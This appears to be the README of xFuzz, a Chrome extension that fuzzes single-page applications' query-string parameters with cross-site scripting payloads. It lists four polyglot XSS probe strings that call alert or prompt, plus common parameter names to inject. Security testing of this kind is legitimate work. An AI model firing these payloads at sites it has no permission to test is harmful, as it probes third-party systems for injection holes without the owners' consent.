# xFuzz

XSS query param fuzzer in a chrome extension. Works on Single Page Applications (SPAs).

![xfuzz](docs/xfuzz.gif)

## Details

1. Fires up a new window
2. Fires up a couple of tabs
3. Fuzzes each query string parameter with XSS payloads
4. Once the window is finished loading it trys a different payload.

Payloads:

```
var payloads = ["<img onerror=prompt(1) src=x>", "javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//><img onerror=prompt(1) srx=x>*/alert()/*",
"--></script></title></style>\"/</textarea><a' onclick=alert()//><img onerror=prompt(1) srx=x>*/alert()/*", "'; alert(1)"]
```

Extra Params
```
var commonQuery = ['admin', 'tag', 'id', 'user', 'userid', 'debug', 'page', 'redirect', 'next', 'callback', 'q']
```

## Contact

c0nrad@c0nrad.io